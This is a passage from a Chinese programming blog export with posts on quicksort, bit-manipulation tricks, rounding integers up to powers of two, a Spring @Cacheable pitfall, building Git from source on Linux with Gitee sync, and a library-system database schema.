<h2 id="模板代码"><a href="#模板代码" class="headerlink" title="模板代码"></a>模板代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">q_sort</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> i = l, j = i + <span class="number">1</span>, key = array[l];</span><br><span class="line">    <span class="keyword">for</span> (; j &lt;= r; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (array[j] &lt; key) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            swap(i, j, array);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    swap(l, i, array);</span><br><span class="line">    q_sort(l, i - <span class="number">1</span>, array);</span><br><span class="line">    q_sort(i + <span class="number">1</span>, r, array);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = array[i];</span><br><span class="line">    array[i] = array[j];</span><br><span class="line">    array[j] = t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>不过<code>JDK</code>自带的<code>Arrays.sort()</code>不香么，除非题目限制不可以使用吧</strong></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>快速排序</tag>
      </tags>
  </entry>
  <entry>
    <title>算法模板之位操作</title>
    <url>/2020/08/24/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF%E4%B9%8B%E4%BD%8D%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p>在计算机中，对数据进行位操作具有十分高的效率，就拿乘法来说，假如乘数是一个2<sup>N</sup>形式的数字，那么就可以使用左移的方式，例如：<code>n * 2 == n &lt;&lt; 1、n * 8 == n &lt;&lt; 3、n / 16 == n &gt;&gt; 4、</code>，实际上位操作还有其他更高级的用法：<a id="more"></a></p>
<h2 id="判断num是否是2的次幂"><a href="#判断num是否是2的次幂" class="headerlink" title="判断num是否是2的次幂"></a>判断num是否是2的次幂</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isPowerOf2</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num &gt; <span class="number">0</span> &amp;&amp; ((num &amp; (num - <span class="number">1</span>)) == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="向上取整为2次幂"><a href="#向上取整为2次幂" class="headerlink" title="向上取整为2次幂"></a>向上取整为2次幂</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">upperPowerOf2</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((num &amp; (num - <span class="number">1</span>)) == <span class="number">0</span>) <span class="keyword">return</span> num;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">return</span> num + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="返回num的最高有效位的掩码"><a href="#返回num的最高有效位的掩码" class="headerlink" title="返回num的最高有效位的掩码"></a>返回num的最高有效位的掩码</h2><p>如i=00..1xx..，则返回00..100..</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">highestOneBit</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        num |= (num &gt;&gt;  <span class="number">1</span>);</span><br><span class="line">        num |= (num &gt;&gt;  <span class="number">2</span>);</span><br><span class="line">        num |= (num &gt;&gt;  <span class="number">4</span>);</span><br><span class="line">        num |= (num &gt;&gt;  <span class="number">8</span>);</span><br><span class="line">        num |= (num &gt;&gt; <span class="number">16</span>);</span><br><span class="line">        <span class="comment">// 无符号右移</span></span><br><span class="line">        <span class="keyword">return</span> num - (num &gt;&gt;&gt; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="保留最右边的“1”"><a href="#保留最右边的“1”" class="headerlink" title="保留最右边的“1”"></a>保留最右边的“1”</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rightmostOneBit</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num &amp; (~num) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="清除最右边的“1”"><a href="#清除最右边的“1”" class="headerlink" title="清除最右边的“1”"></a>清除最右边的“1”</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">clearLowestBit</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n &amp; (n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>位操作</tag>
      </tags>
  </entry>
  <entry>
    <title>将正整数向上取整为2次幂</title>
    <url>/2020/08/11/%E5%B0%86int%E7%B1%BB%E5%9E%8B%E6%95%B4%E6%95%B0%E5%90%91%E4%B8%8A%E5%8F%962%E6%AC%A1%E5%B9%82/</url>
    <content><![CDATA[<blockquote>
<p>本文参考了哔哩哔哩UP主<code>LH_Mouse</code>的<a href="https://www.bilibili.com/video/BV1tT4y177SR?t=650" target="_blank" rel="noopener">视频</a></p>
</blockquote>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>生活中我们可能经常遇到将给定的整数向上取整为最接近该数字的2次幂的情况，例如25的向上取整2次幂最接近该数字是32 = 2^5，37的向上取整2次幂最接近该数字是64 = 2^6，该算法也用很广泛的应用，例如<a href="http://c.biancheng.net/view/1284.html" target="_blank" rel="noopener">伙伴系统和slab内存分配机制</a>中，分配器在分配内存的时候，首先计算该次请求分配大小的向上取整2次幂，<a id="more"></a>将该大小的空间返回，即假如请求8<code>kb</code>， 则分配8<code>kb</code>大下的空间，假如请求分配9<code>kb</code>，则分配16<code>kb</code>的大小空间；又如，<code>Java</code>中的<code>HashMap</code>内部实际上是使用了数组，而且该数组的长度大小总是2^n，假如实例化<code>HashMap</code>的时候指定大小为<code>length</code>，那么实际上<code>HashMap</code>内部的数组大小就是<code>length</code>的向上取整2次幂。</p>
<h2 id="算法讲解"><a href="#算法讲解" class="headerlink" title="算法讲解"></a>算法讲解</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>利用一个变量，该变量从1不断地翻倍，假如该变量乘上2大于等于<code>target</code>，那么该变量的两倍即为所求：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt;= <span class="number">1</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> iteration = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ((iteration &lt;&lt; <span class="number">1</span>) &lt; num)&#123;</span><br><span class="line">        iteration &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> iteration &lt;&lt; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是上面的算法时间复杂度是<code>O(log(n))</code>，下面介绍一种时间复杂度是<code>O(1)</code>的解法：</p>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>对于一般的数字，例如25，它的二进制是<code>b011001</code>，其向上取整为2次幂为32，对应的二进制为<code>b100000</code>，11对应的二进制数字为<code>b01011</code>，其向上取整为2次幂为16，对应的二进制为<code>b10000</code>，即对于非2^n的整数<code>a</code>，只需要将其二进制最左边的1取出来，再将该位置的右边全部替换为0，然后将该数字左移一位得到数字<code>b</code>，<code>b</code>就是<code>a</code>对应的向上取整为2次幂的数字。</p>
<p>所以关键就是如何将给定数字的最左边的1给提取出来，很容易想到的一个办法就是：不断地将该数字往右移，并记录下移动的次数，直到将该数字变为1：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt;= <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (num &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        num &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 经过下面的处理，num 只保留了最左边的1</span></span><br><span class="line">    num &lt;&lt;= count;</span><br><span class="line">    <span class="comment">//向上取2次幂</span></span><br><span class="line">    <span class="keyword">return</span> num &lt;&lt; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是很遗憾，上面的时间复杂度是仍然是<code>O(log(n))</code>，而且部分答案不正确，如8对应的解是16（当然了，这种错误想要避免也很容易）。</p>
<p>我们再想想，由<code>25 = b011001</code>到<code>32 = b100000</code>，不一定要“将最左边的1提取出来，然后该位置的右边全部赋值为0，再将数字往左移一位”这种方法，也可以将25的二进制数中，找出第一个1的位置，然后将该位置的右边全部置为1，即<code>b011111</code>，然后将得到的数字加1，得到<code>b100000</code>，该数字不就是所求吗？</p>
<p>关键步骤就变成了怎么将给定数字的最高有效位的右边全部置为1（包含该位置），这里我们可以从算术右移中找到灵感，算数右移就是符号位跟着移动，并且符号位跟原来的符号位一致；</p>
<p>假如给定数字是<code>001xxxxx</code>，那么该怎么变成<code>0011xxxx</code>？借助移位操作和或运算即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; 001xxxxx</span><br><span class="line">b &#x3D; 0001xxxx</span><br><span class="line">c &#x3D; a | b</span><br><span class="line">  &#x3D; 0011xxxx</span><br></pre></td></tr></table></figure>

<p>由<code>0011xxxx</code>又该怎么变成<code>001111xx</code>？还是借助移位操作和或运算即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; 0011xxxx</span><br><span class="line">b &#x3D; 000011xx</span><br><span class="line">c &#x3D; a | b</span><br><span class="line">  &#x3D; 001111xx</span><br></pre></td></tr></table></figure>

<p>……</p>
<p>但是我们什么时候结束上面的操作？请注意我们的<code>int</code>类型是32位字长，为了确保所有的正整数都可以被考虑到，如某个整数<code>0x20000001</code>，我们需要将最左边的1移动29次，我们只需要将<code>num</code>右移16位，然后再异或一次，将得到32个“1”（当然了，末尾的几个1会被舍弃），该算法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt;= <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">return</span> num + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是前文说到，当给定的数字本身就是符合2^n，该算法返回的是2^(n + 1)，所有我们在算法的开始前要先判断一下给定数字是不是2的次幂，如果一个数字是2的次幂，那么它的二进制一定是<code>n = 00……10000……0</code>，该数字减一后一定是<code>n - 1 = 00……01111……1</code>，这二者进行与运输后结果为0，根据这个即可判断给定数字是不是2的次幂，改进后的算法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((num &amp; (num - <span class="number">1</span>)) == <span class="number">0</span>) <span class="keyword">return</span> num;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">return</span> num + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>移位</tag>
        <tag>异或</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Boot @Cacheable 失效的解决方法</title>
    <url>/2020/07/31/Spring-Boot-Cacheable-%E5%A4%B1%E6%95%88%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<blockquote>
<p>文章参考了博客园的 <strong>zhaoyue1215</strong> 用户分享的文章【<a href="https://www.cnblogs.com/zhaoyue1215/p/9267584.html" target="_blank" rel="noopener">Spring @Cacheable 缓存不生效的问题</a>】</p>
</blockquote>
<p>今天在使用<code>Spring Boot</code>的缓存时候，发现控制台一直输出<code>Hibernate</code>访问数据库时执行的<code>Sql</code>语句，<code>@EnableCaching</code>注解已经添加到主启动类中， <code>@Cacheable</code>也加到了相应的服务方法上，但是我把断点打到了<code>ConcurrentMapCacheManager</code>类中的方法<code>getCache(String name)</code>上后，测试过程发现根本就没有调用该方法，即缓存不生效！<a id="more"></a></p>
<h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>后来查阅资料发现，如果注解都正确添加，缓存不生效的可能是因为被添加<code>@Cacheable</code>的方法是在内部被其他方法，这样子是无法使用缓存的，例如说我这次情况：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 将数据库中的Blog对象取出来，将其属性content（MarkDown语法）转为HTML格式</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Blog <span class="title">getAndConvert</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">    Blog blog = getBlog(id)</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">return</span> blog;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Cacheble</span>()</span><br><span class="line"><span class="function"><span class="keyword">public</span> Blog <span class="title">getBlog</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">return</span> blog;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为<code>@Cacheable</code>是基于<code>Spring AOP</code>代理类，内部方法调用是不走代理的，<code>@Cacheable</code>是不起作用的 ，因此需要将这两个方法放到不同的类中。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Spring Boot</tag>
        <tag>缓存</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux安装Git、与Windows系统关联同一个码云仓库</title>
    <url>/2020/07/06/Linux%E5%AE%89%E8%A3%85Git%E3%80%81%E4%B8%8EWindows%E7%B3%BB%E7%BB%9F%E5%85%B3%E8%81%94%E5%90%8C%E4%B8%80%E4%B8%AA%E4%BB%93%E5%BA%93/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>有的时候需要在云主机上跑跑程序，但是在没有图形界面的Linux系统上，利用<code>vim</code>编写代码效率还是比较低，当然可以利用<code>Xftp</code>相关的软件直接向云主机发送源程序，也可以通过邮件系统的文件中转站等其他办法。但是我发现这样子还是不太方便，为什么不利于版本控制工具，在<code>Windows</code>系统上利用<code>IDE</code>开发工具编写好代码，推送到远端仓库，在<code>Linux</code>端拉取代码，这样子不是更加方便？下面我介绍一下该方法。<a id="more"></a></p>
<p>在这之前需要注册一个<code>GitHub</code>账户或者码云账户，我这里选择的是码云</p>
<h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p>可以使用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install git</span><br></pre></td></tr></table></figure>

<p>这样子简单快速，但是这样子安装的版本通常都是非常低的，所以我这里不使用这种方法，我们可以从<code>GitHub</code>上面找到自己喜欢的版本，下面开始我们的步骤：</p>
<ol>
<li><p>去<code>GitHub</code>上面搜索<code>git</code>，进入到<code>release</code>页面寻找自己喜欢的版本</p>
<p>然后使用下面的命令下载安装包的压缩包：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://codeload.github.com/git/git/tar.gz/v2.27.0</span><br></pre></td></tr></table></figure>

<p><code>v2.27.0</code>是版本号</p>
</li>
<li><p>解包解压</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf v2.27.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>编译源码</p>
<p>解包解压完毕，就会生成<code>git-2.27.0</code>文件夹，进入该文件夹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd git-2.27.0</span><br></pre></td></tr></table></figure>

<p>理论上说现在就可以进行编译了，但是编译过程可能会缺失相关库文件，因此建议先安装相关库文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel gcc perl-ExtUtils-MakeMaker</span><br></pre></td></tr></table></figure>

<p>执行上面的步骤的时候，系统会安装旧版的<code>Git</code>，因此需要先删除：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum remove git</span><br></pre></td></tr></table></figure>

<p>开始编译</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make prefix=/usr/local/git all</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置安装路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make prefix=/usr/local/git install</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置环境变量</p>
<p>打开配置文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/profile</span><br></pre></td></tr></table></figure>

<p>在最下面加上：</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">PATH</span>=<span class="string">$PATH:/usr/local/git/bin</span></span><br><span class="line"><span class="attr">export</span> <span class="string">PATH</span></span><br></pre></td></tr></table></figure>

<p>刷新配置文件，使得文件生效：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>

<p>检查版本:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure>

<p>出现版本号就说明<code>Git</code>安装好了</p>
</li>
</ol>
<h2 id="配置Git"><a href="#配置Git" class="headerlink" title="配置Git"></a>配置Git</h2><p>配置账号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name "码云注册的用户名"</span><br><span class="line">git config --global user.email "码云注册的邮箱"</span><br></pre></td></tr></table></figure>

<p>生成密钥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C "码云的邮箱"</span><br></pre></td></tr></table></figure>

<p>接下来按下回车键几次就可以了</p>
<p><img src="https://q.yalexin.top/%E8%B7%AF%E5%BE%84.png" alt></p>
<p>红色圈住的是密钥文件路径</p>
<p>直到出现下面的信息即可：</p>
<p><img src="https://q.yalexin.top/%E7%94%9F%E6%88%90%E5%AF%86%E9%92%A5.png" alt></p>
<p>查看刚刚生成的密钥文件内容:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /root/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>

<p>复制上面的信息，到码云平台中的“设置”，“SSH公钥”中添加刚刚复制的信息即可</p>
<h2 id="Windows配置Git"><a href="#Windows配置Git" class="headerlink" title="Windows配置Git"></a>Windows配置Git</h2><p>这个应该不会太难，使用图形化界面安装，一直<code>next</code>即可，或者参照我的另<a href="https://www.yalexin.top/index.php/archives/22/" target="_blank" rel="noopener">一篇文章</a>。</p>
<h2 id="建立仓库"><a href="#建立仓库" class="headerlink" title="建立仓库"></a>建立仓库</h2><p>在码云网站新建一个仓库</p>
<p>在<code>Linux</code>系统的某个文件夹下依次输入以下命令:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line">touch README.md</span><br><span class="line">git add .</span><br><span class="line">git commit -m "Linux下的提交"</span><br><span class="line">git remote add origin git@gitee.com:YaleXin/linux-windows.git # YaleXin是你的账户名字，linux-windows是你的刚刚新建的仓库</span><br><span class="line">git push</span><br></pre></td></tr></table></figure>

<p>这样子远端仓库就会出现刚刚的<code>README.md</code>文件了</p>
<p>来到<code>Windows</code>系统端，新建一个文件夹，进入该文件夹，右键鼠标，点击<code>Git Bash Here</code>，输入下面的命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone git@gitee.com:YaleXin/linux-windows.git</span><br></pre></td></tr></table></figure>

<p>然后简单修改一下<code>README.md</code>文件</p>
<p>输入下面命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m "Windows系统进行修改"</span><br><span class="line">git push</span><br></pre></td></tr></table></figure>

<p>如果在<code>Windows</code>系统下配置好了<code>git</code>后，远端仓库就会出现新文件的内容了</p>
<p>回到<code>Linux</code>系统下，在之前的仓库所在文件夹下输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure>

<p>本地仓库就会同步远端仓库的内容了。当然了有可能会产生冲突，解决冲突办法参照官网或者网上其他帖子即可。</p>
<p>这样子就算是利用远端仓库，实现云主机和本地进行互通了，后续就可以在<code>Windows</code>上利用<code>IDE</code>集成开发环境进行愉快地编程了。</p>
]]></content>
      <categories>
        <category>Linux相关</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>图书借阅管理系统</title>
    <url>/2020/07/03/%E5%9B%BE%E4%B9%A6%E5%80%9F%E9%98%85%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<blockquote>
<p>项目地址：<a href="https://gitee.com/YaleXin/caozuoxitongkechengsheji" target="_blank" rel="noopener">gitee</a></p>
</blockquote>
<p>一次数据库课程设计，系统界面用C语言，后台数据用<code>MySQL</code>（如果不知道如何用C语言连接<code>MySQL</code>,参照我的<a href="https://www.yalexin.top/index.php/archives/46/" target="_blank" rel="noopener">上一篇文章</a>）。<a id="more"></a></p>
<h2 id="数据库设计"><a href="#数据库设计" class="headerlink" title="数据库设计"></a>数据库设计</h2><ul>
<li>E-R图</li>
</ul>
<p><img src="https://q.yalexin.top/%E6%80%BB%E4%BD%93er%E5%9B%BE.png" alt></p>
<ul>
<li><p>五张表：</p>
<ol>
<li><p>用户表（<u>编号</u>，姓名，性别，年龄）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE &#96;users&#96; (</span><br><span class="line">  &#96;PNO&#96; int(11) NOT NULL,</span><br><span class="line">  &#96;PNAME&#96; varchar(20) NOT NULL,</span><br><span class="line">  &#96;GENDER&#96; enum(&#39;男&#39;,&#39;女&#39;) NOT NULL,</span><br><span class="line">  &#96;AGE&#96; int(20) DEFAULT &#39;18&#39;,</span><br><span class="line">  PRIMARY KEY (&#96;PNO&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8</span><br></pre></td></tr></table></figure>
</li>
<li><p>书籍表（<u>编号</u>，书名，库存）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE &#96;books&#96; (</span><br><span class="line">   &#96;BNO&#96; int(11) NOT NULL,</span><br><span class="line">   &#96;BNAME&#96; varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,</span><br><span class="line">   &#96;BINVENTORY&#96; int(11) NOT NULL DEFAULT &#39;0&#39;,</span><br><span class="line">   PRIMARY KEY (&#96;BNO&#96;)</span><br><span class="line"> ) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8</span><br></pre></td></tr></table></figure>
</li>
<li><p>书商表（<u>编号</u>，书商名，地址）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE &#96;booksellers&#96; (</span><br><span class="line">  &#96;SNO&#96; int(11) NOT NULL,</span><br><span class="line">  &#96;SNAME&#96; varchar(20) DEFAULT NULL,</span><br><span class="line">  &#96;ADDR&#96; varchar(50) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;SNO&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8</span><br></pre></td></tr></table></figure>
</li>
<li><p>借阅表（<u>书籍编号</u>，<u>用户编号</u>，借阅日期，归还日期，是否已归还）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE &#96;borrowings&#96; (</span><br><span class="line">  &#96;BNO&#96; int(11) DEFAULT NULL,</span><br><span class="line">  &#96;PNO&#96; int(11) DEFAULT NULL,</span><br><span class="line">  &#96;BDATE&#96; timestamp NOT NULL DEFAULT &#39;0000-00-00 00:00:00&#39;,</span><br><span class="line">  &#96;RDATE&#96; timestamp NULL DEFAULT &#39;0000-00-00 00:00:00&#39;,</span><br><span class="line">  &#96;ISRETURN&#96; tinyint(1) DEFAULT &#39;0&#39;,</span><br><span class="line">  KEY &#96;borrowings_ibfk_1&#96; (&#96;PNO&#96;),</span><br><span class="line">  KEY &#96;borrowings_ibfk_2&#96; (&#96;BNO&#96;),</span><br><span class="line">  CONSTRAINT &#96;borrowings_ibfk_1&#96; FOREIGN KEY (&#96;PNO&#96;) REFERENCES &#96;users&#96; (&#96;PNO&#96;) ON DELETE SET NULL ON UPDATE CASCADE,</span><br><span class="line">  CONSTRAINT &#96;borrowings_ibfk_2&#96; FOREIGN KEY (&#96;BNO&#96;) REFERENCES &#96;books&#96; (&#96;BNO&#96;) ON DELETE SET NULL ON UPDATE CASCADE</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8mb4</span><br></pre></td></tr></table></figure>
</li>
<li><p>入库表（<u>书商编号</u>，<u>书籍编号</u>，入库数量）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE &#96;warehousings&#96; (</span><br><span class="line">   &#96;SNO&#96; int(11) DEFAULT NULL,</span><br><span class="line">   &#96;BNO&#96; int(11) DEFAULT NULL,</span><br><span class="line">   &#96;NUM&#96; int(11) DEFAULT NULL,</span><br><span class="line">   KEY &#96;SNO&#96; (&#96;SNO&#96;),</span><br><span class="line">   KEY &#96;BNO&#96; (&#96;BNO&#96;),</span><br><span class="line">   CONSTRAINT &#96;warehousings_ibfk_1&#96; FOREIGN KEY (&#96;SNO&#96;) REFERENCES &#96;booksellers&#96; (&#96;SNO&#96;) ON UPDATE CASCADE,</span><br><span class="line">   CONSTRAINT &#96;warehousings_ibfk_2&#96; FOREIGN KEY (&#96;BNO&#96;) REFERENCES &#96;books&#96; (&#96;BNO&#96;) ON DELETE SET NULL ON UPDATE CASCADE</span><br><span class="line"> ) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>存储过程</p>
<ol>
<li><p>借阅：根据用户ID和书籍ID，形成借阅关系</p>
